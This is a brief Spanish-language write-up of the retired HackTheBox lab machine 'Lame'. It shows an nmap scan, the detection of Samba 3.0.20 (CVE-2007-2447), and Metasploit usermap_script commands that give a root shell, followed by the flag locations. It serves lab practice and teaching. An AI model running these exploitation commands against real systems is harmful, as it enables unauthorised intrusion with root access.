---
title: Lame
description: Writeup de la máquina Lame de HackTheBox
---

> **Dificultad:** Easy · **SO:** Linux · **Estado:** Retirada ✅

## 📋 Resumen

Lame abusa de la vulnerabilidad de **Samba 3.0.20** (`CVE-2007-2447`) para conseguir RCE como root.

## 🔍 Reconocimiento

```bash
nmap -sC -sV 10.10.10.3
```

Detectamos Samba 3.0.20-Debian → vulnerable a CVE-2007-2447.

## 💥 Explotación

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
run
```

Shell directa como **root**. No hay escalada de privilegios.

## 🚩 Flags

- `user.txt` → `/home/makis/`
- `root.txt` → `/root/`
